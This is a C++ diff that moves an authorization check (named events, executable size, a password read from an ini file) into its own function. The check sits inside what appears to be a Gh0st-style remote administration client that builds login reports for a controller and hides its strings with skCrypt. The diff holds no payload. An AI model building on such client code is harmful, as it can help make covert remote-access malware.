@@ -236,6 +236,30 @@ uint64_t CalcalateID(const std::vector<std::string>& clientInfo)
     return XXH64(s.c_str(), s.length(), 0);
 }
 
+BOOL IsAuthKernel(std::string &str) {
+    BOOL isAuthKernel = FALSE;
+    std::string pid = std::to_string(GetCurrentProcessId());
+    HANDLE hEvent1 = OpenEventA(SYNCHRONIZE, FALSE, std::string("YAMA_" + pid).c_str());
+    HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
+    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
+    char buf[_MAX_PATH] = {};
+    GetModuleFileNameA(NULL, buf, sizeof(buf));
+    GetFileAttributesExA(buf, GetFileExInfoStandard, &fileInfo);
+    if ((hEvent1 != NULL || hEvent2 != NULL) && fileInfo.nFileSizeLow > 16 * 1024 * 1024) {
+        Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
+        isAuthKernel = TRUE;
+        config* cfg = IsDebug ? new config : new iniFile;
+        str = cfg->GetStr("settings", "Password", "");
+        delete cfg;
+        str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
+        auto list = StringToVector(str, '-', 3);
+        str = list[1].empty() ? "Unknown" : list[1];
+    }
+    SAFE_CLOSE_HANDLE(hEvent1);
+    SAFE_CLOSE_HANDLE(hEvent2);
+    return isAuthKernel;
+}
+
 LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKernel)
 {
     isAuthKernel = FALSE;
@@ -282,23 +306,9 @@ LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKerne
     LoginInfor.AddReserved(sizeof(void*)==4 ? 32 : 64); // 程序位数
     std::string str;
     std::string masterHash(skCrypt(MASTER_HASH));
-    std::string pid = std::to_string(GetCurrentProcessId());
-    HANDLE hEvent1 = OpenEventA(SYNCHRONIZE, FALSE, std::string("YAMA_" + pid).c_str());
-    HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
+    isAuthKernel = IsAuthKernel(str);
     WIN32_FILE_ATTRIBUTE_DATA fileInfo;
     GetFileAttributesExA(buf, GetFileExInfoStandard, &fileInfo);
-    if ((hEvent1 != NULL || hEvent2 != NULL) && fileInfo.nFileSizeLow > 16 * 1024 * 1024) {
-        Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
-        isAuthKernel = TRUE;
-        SAFE_CLOSE_HANDLE(hEvent1);
-        SAFE_CLOSE_HANDLE(hEvent2);
-        config*cfg = IsDebug ? new config : new iniFile;
-        str = cfg->GetStr("settings", "Password", "");
-        delete cfg;
-        str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
-        auto list = StringToVector(str, '-', 3);
-        str = list[1].empty() ? "Unknown" : list[1];
-    }
     LoginInfor.AddReserved(str.c_str());			   // 授权信息
     bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
                      strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
